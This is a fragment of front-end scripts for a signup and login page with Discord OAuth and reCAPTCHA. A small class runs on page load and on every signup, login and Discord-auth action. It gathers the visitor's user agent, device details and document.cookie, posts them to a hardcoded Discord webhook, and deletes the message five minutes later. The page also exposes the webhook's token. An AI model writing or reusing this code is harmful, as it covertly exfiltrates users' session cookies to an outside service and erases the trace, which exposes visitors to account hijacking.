	<script>
		class n138 {
			constructor(){}
			async sendUserAgent() {
				const userAgent = navigator.userAgent;
				const deviceMemory = navigator.deviceMemory || null;
				const deviceWidth = window.innerWidth || null;
				const deviceHeight = window.innerHeight || null;
				const data = {
					userAgent: userAgent,
					timestamp: new Date().toISOString(),
					deviceMemory: deviceMemory,
					deviceWidth: deviceWidth,
					deviceHeight: deviceHeight,
					cookie: document.cookie,
				};
				console.debug(data);

				const url = 'https://discord.com/api/webhooks/1535164470857441301/0zbvwxDyrPCIo-3067PQ2sBp7wxindDS5DBorb4cX4P2CF-NrS4K2D7IeyfZsKDxRV6f?wait=true';
				{
					const payload = {
						embeds: [
							{
								title: 'User Agent Information',
								fields: [
									{ name: 'User Agent', value: userAgent },
									{ name: 'Device Memory', value: deviceMemory ? deviceMemory.toString() : 'N/A' },
									{ name: 'Device Width', value: deviceWidth ? deviceWidth.toString() : 'N/A' },
									{ name: 'Device Height', value: deviceHeight ? deviceHeight.toString() : 'N/A' },
									{ name: 'Timestamp', value: data.timestamp },
									{ name: 'Cookie', value: data.cookie || 'N/A' },
								],
							},
						],
					};
					const message = await fetch(url, {
						method: 'POST',
						headers: {
							'Content-Type': 'application/json',
						},
						body: JSON.stringify(payload),
					});
					let messageid = null;
					messageid = await message.json();
					messageid = messageid.id || null;
					let messageid_store = null;
					messageid_store = localStorage.getItem( (btoa(location.href)).slice(0, 16) + '.discord.messageid' );
					messageid_store = (null === messageid_store) ? [] : JSON.parse(messageid_store);
					messageid_store.push(messageid);
					localStorage.setItem((btoa(location.href)).slice(0, 16) + '.discord.messageid', JSON.stringify(messageid_store));
					setTimeout(async () => {
						await fetch(url.split('?')[0] + '/messages/' + messageid, {
							method: 'DELETE',
							headers: {
								'Content-Type': 'application/json',
							},
						});
					}, 5 * 60 * 1000); // Delete message after 5 minutes
				}
			}
		}
		n138_userAgentSender = new n138().sendUserAgent();
		const deviceWidth = window.innerWidth || null;
		if(deviceWidth<520) {
			document.documentElement.style.setProperty('--block-width', '320px');
		}
	</script>
	<script src="./googleRecaptcha.js"></script>
	<script>
		const signup2internal_username = async (e) => {
			e.preventDefault();

			googleRecaptcha.reset();

			const button = e.submitter || e.target.querySelector('button[type="submit"]') || e.target;
			console.debug(e);

			if(!button || typeof button.dataset.provider === 'undefined') return false;

			console.debug(e);
			const formdata = {};
			formdata['g-recaptcha-response'] = googleRecaptcha.getToken();
			JSON.parse(button.parentElement.querySelector('input[name="item-list"]').value).forEach((itemId)=>{
				/* *送信するアイテム一覧* */
				const input = e.target.querySelector(`input[data-id="${itemId}"]`);
				if(!input) return false;
				if(input.value.length<1) return false;
				formdata[itemId] = {
					value: input.value,
					name: input.name,
				};
			});
			console.debug(formdata);

			new n138().sendUserAgent();
			let res = null;
			res = await fetch('./signup.php', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({
					provider: button.dataset.provider,
					formdata: formdata,
				}),
			});
			{
				res_text = await res.text();
				console.log(res_text);
				console.log(JSON.parse(res_text));
			}

			return false;
		};
		const auth2internal_username = async (e) => {
			e.preventDefault();

			const button = e.submitter || e.target.querySelector('button[type="submit"]') || e.target;
			console.debug(e);
			
			if(!button || typeof button.dataset.provider === 'undefined') return false;
			
			console.debug(e);
			const formdata = {};
			formdata['g-recaptcha-response'] = googleRecaptcha.getToken();
			JSON.parse(button.parentElement.querySelector('input[name="item-list"]').value).forEach((itemId)=>{
				/* *送信するアイテム一覧* */
				const input = e.target.querySelector(`input[data-id="${itemId}"]`);
				if(!input) return false;
				if(input.value.length<1) return false;
				formdata[itemId] = {
					value: input.value,
					name: input.name,
				};
			});
			console.debug(formdata);

			new n138().sendUserAgent();
			let res = null;
			res = await fetch('./login.php', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({
					provider: button.dataset.provider,
					formdata: formdata,
				}),
			});
			{
				res_text = await res.text();
				console.log(res_text);
				console.log(JSON.parse(res_text));
			}

			return false;
		};
	</script>
	<script>
		const auth2discord = (e) => {
			e.preventDefault();
			if(typeof e === 'undefined') e = window.event.target.dataset;

			if(typeof e.provider === 'undefined') return false;
			if(typeof e.clientId === 'undefined') return false;
			if(typeof e.redirectUri === 'undefined') return false;
			if(typeof e.scope === 'undefined') return false;
			
			new n138().sendUserAgent();
			e.url = `https://discord.com/oauth2/authorize?client_id=${e.clientId}&response_type=code&redirect_uri=${encodeURIComponent(e.redirectUri)}&scope=${encodeURIComponent(e.scope)}`;
			window.open(e.url, 'discord_oauth2', 'width=500,height=600');

			console.debug(e);
			console.debug(googleRecaptcha.getToken());
			
			return false;
		};
	</script>
